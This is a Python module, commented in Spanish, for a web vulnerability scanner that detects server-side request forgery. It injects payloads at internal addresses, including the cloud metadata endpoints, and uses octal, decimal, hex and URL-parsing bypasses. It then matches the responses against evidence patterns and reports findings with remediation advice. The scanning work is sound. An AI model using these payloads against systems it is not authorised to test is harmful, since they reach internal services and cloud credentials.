"""
Módulo de detección de SSRF (Server-Side Request Forgery).
Detecta vulnerabilidades que permiten realizar peticiones desde el servidor.
"""

import requests
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from core.base_module import VulnerabilityModule
from core.logger import get_logger
from datetime import datetime
import json
import os


class SSRFModule(VulnerabilityModule):
    """
    Detecta vulnerabilidades SSRF (Server-Side Request Forgery).
    """
    
    # Payloads SSRF básicos
    INTERNAL_TARGETS = [
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254",  # AWS metadata
        "http://metadata.google.internal",  # GCP metadata
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    ]
    
    # Bypass techniques
    BYPASS_PAYLOADS = [
        "http://127.1",
        "http://0177.0.0.1",  # Octal
        "http://2130706433",  # Decimal
        "http://0x7f.0x0.0x0.0x1",  # Hex
        "http://localhost@127.0.0.1",
        "http://127.0.0.1#@google.com",
        "http://google.com#@127.0.0.1",
    ]
    
    # Patrones de evidencia SSRF
    SSRF_EVIDENCE_PATTERNS = [
        # Respuestas de servicios internos
        r'<title>.*?(localhost|127\.0\.0\.1)',
        r'Apache.*?Server',
        r'nginx',
        r'IIS',
        
        # AWS metadata
        r'ami-id',
        r'instance-id',
        r'iam/security-credentials',
        
        # Errores de conexión que revelan SSRF
        r'Connection refused',
        r'Connection timed out',
        r'No route to host',
        r'Network is unreachable',
        
        # Respuestas de servicios comunes
        r'<html',
        r'<!DOCTYPE',
    ]

    def __init__(self, config):
        super().__init__(config)
        self.logger = get_logger("ssrf_module")
        self.target_url = config.get("target_url")
        self.findings = []
        self.tested_params = set()
        self.scan_timestamp = config.get("scan_timestamp", datetime.now().strftime("%Y%m%d_%H%M%S"))
        self.report_dir = config.get("report_dir", f"reports/scan_{self.scan_timestamp}")
        self.timeout = config.get("timeout", 5)

    def scan(self):
        """Ejecuta el escaneo completo de SSRF."""
        self.logger.info(f"[SSRF] Iniciando escaneo de SSRF en: {self.target_url}")
        
        try:
            # 1. Detectar parámetros susceptibles a SSRF
            injection_points = self._discover_injection_points()
            
            if not injection_points:
                self.logger.warning("[SSRF] No se encontraron puntos de inyección")
                return
            
            self.logger.info(f"[SSRF] Encontrados {len(injection_points)} puntos de inyección")
            
            # 2. Probar SSRF
            self._test_ssrf_injection(injection_points)
            
            # 3. Exportar resultados
            self._export_results()
            
            # Resumen
            critical = len([f for f in self.findings if f["severity"] == "critical"])
            high = len([f for f in self.findings if f["severity"] == "high"])
            
            self.logger.info(f"[SSRF] Escaneo completado: {len(self.findings)} hallazgos")
            self.logger.info(f"[SSRF] Severidad: Critical={critical}, High={high}")
            
        except Exception as e:
            self.logger.error(f"[SSRF] Error inesperado: {e}")

    def _discover_injection_points(self):
        """Descubre parámetros susceptibles a SSRF."""
        injection_points = []
        
        try:
            response = requests.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 1. Parámetros GET con nombres relacionados a URLs
            parsed = urlparse(self.target_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    # Priorizar parámetros que probablemente contengan URLs
                    if any(keyword in param.lower() for keyword in ['url', 'uri', 'link', 'src', 'dest', 'redirect', 'proxy', 'api', 'callback', 'webhook']):
                        injection_points.append({
                            'type': 'GET',
                            'url': self.target_url,
                            'param': param,
                            'method': 'GET'
                        })
            
            # 2. Formularios con campos relacionados a URLs
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()
                action_url = urljoin(self.target_url, action) if action else self.target_url
                
                inputs = form.find_all(['input', 'textarea'])
                for inp in inputs:
                    name = inp.get('name')
                    if name and any(keyword in name.lower() for keyword in ['url', 'uri', 'link', 'src', 'dest', 'redirect', 'proxy', 'api', 'callback', 'webhook']):
                        injection_points.append({
                            'type': 'FORM',
                            'url': action_url,
                            'param': name,
                            'method': method
                        })
            
            self.logger.info(f"[SSRF] Descubiertos {len(injection_points)} puntos de inyección")
            
        except Exception as e:
            self.logger.error(f"[SSRF] Error descubriendo puntos de inyección: {e}")
        
        return injection_points

    def _test_ssrf_injection(self, injection_points):
        """Prueba SSRF injection."""
        self.logger.info("[SSRF] Probando SSRF injection...")
        
        all_payloads = self.INTERNAL_TARGETS + self.BYPASS_PAYLOADS
        
        for point in injection_points:
            param_key = f"{point['url']}:{point['param']}"
            if param_key in self.tested_params:
                continue
            
            self.tested_params.add(param_key)
            
            # Obtener respuesta baseline
            try:
                baseline_response = self._make_request(point, "https://www.google.com")
                baseline_text = baseline_response.text if baseline_response else ""
                baseline_time = baseline_response.elapsed.total_seconds() if baseline_response else 0
            except:
                continue
            
            for payload in all_payloads:
                try:
                    response = self._make_request(point, payload)
                    
                    if not response:
                        continue
                    
                    response_time = response.elapsed.total_seconds()
                    
                    # Verificar evidencia de SSRF
                    evidence = self._detect_ssrf_evidence(response.text, payload)
                    
                    # Detectar diferencias significativas
                    length_diff = abs(len(response.text) - len(baseline_text))
                    time_diff = abs(response_time - baseline_time)
                    
                    if evidence or (length_diff > 500 and time_diff > 1):
                        severity = "critical" if "169.254.169.254" in payload or "metadata" in payload else "high"
                        
                        finding = {
                            "type": "ssrf_injection",
                            "severity": severity,
                            "title": f"SSRF (Server-Side Request Forgery) en parámetro '{point['param']}'",
                            "description": f"El parámetro '{point['param']}' es vulnerable a SSRF. El servidor realiza peticiones a URLs controladas por el atacante, permitiendo acceso a recursos internos.",
                            "cvss": 9.1 if severity == "critical" else 8.6,
                            "cwe": "CWE-918",
                            "owasp": "A10:2021 - Server-Side Request Forgery",
                            "recommendation": "Validar y sanitizar todas las URLs de entrada. Usar whitelist de dominios permitidos. Bloquear acceso a IPs privadas y metadata endpoints.",
                            "references": [
                                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                                "https://portswigger.net/web-security/ssrf"
                            ],
                            "evidence": {
                                "url": point['url'],
                                "parameter": point['param'],
                                "method": point['method'],
                                "payload": payload,
                                "evidence_found": evidence if evidence else "Diferencia significativa en respuesta",
                                "response_length_diff": length_diff,
                                "response_time_diff": time_diff,
                                "vulnerable": True
                            }
                        }
                        
                        self.findings.append(finding)
                        self.logger.warning(f"[SSRF] SSRF encontrado: {point['url']} (param: {point['param']})")
                        break
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    self.logger.debug(f"[SSRF] Error probando {point['param']}: {e}")

    def _make_request(self, point, payload):
        """Realiza una petición HTTP con el payload."""
        try:
            if point['method'] == 'GET':
                parsed = urlparse(point['url'])
                params = parse_qs(parsed.query)
                params[point['param']] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                return requests.get(test_url, timeout=self.timeout, allow_redirects=True)
            
            else:  # POST
                data = {point['param']: payload}
                return requests.post(point['url'], data=data, timeout=self.timeout, allow_redirects=True)
        
        except Exception as e:
            self.logger.debug(f"[SSRF] Error en request: {e}")
            return None

    def _detect_ssrf_evidence(self, response_text, payload):
        """Detecta evidencia de SSRF en la respuesta."""
        for pattern in self.SSRF_EVIDENCE_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def _export_results(self):
        """Exporta los hallazgos a JSON."""
        try:
            os.makedirs(self.report_dir, exist_ok=True)
            
            output_data = {
                "scan_info": {
                    "target": self.target_url,
                    "timestamp": self.scan_timestamp,
                    "module": "ssrf",
                    "total_findings": len(self.findings),
                    "tested_parameters": len(self.tested_params)
                },
                "findings": self.findings,
                "summary": {
                    "critical": len([f for f in self.findings if f["severity"] == "critical"]),
                    "high": len([f for f in self.findings if f["severity"] == "high"]),
                    "medium": len([f for f in self.findings if f["severity"] == "medium"]),
                    "low": len([f for f in self.findings if f["severity"] == "low"])
                }
            }
            
            output_path = os.path.join(self.report_dir, "ssrf_findings.json")
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)
            
            self.logger.info(f"[SSRF] Resultados exportados en: {output_path}")
            
        except Exception as e:
            self.logger.error(f"[SSRF] Error al exportar resultados: {e}")

    def get_results(self):
        """Devuelve los hallazgos encontrados."""
        return self.findings
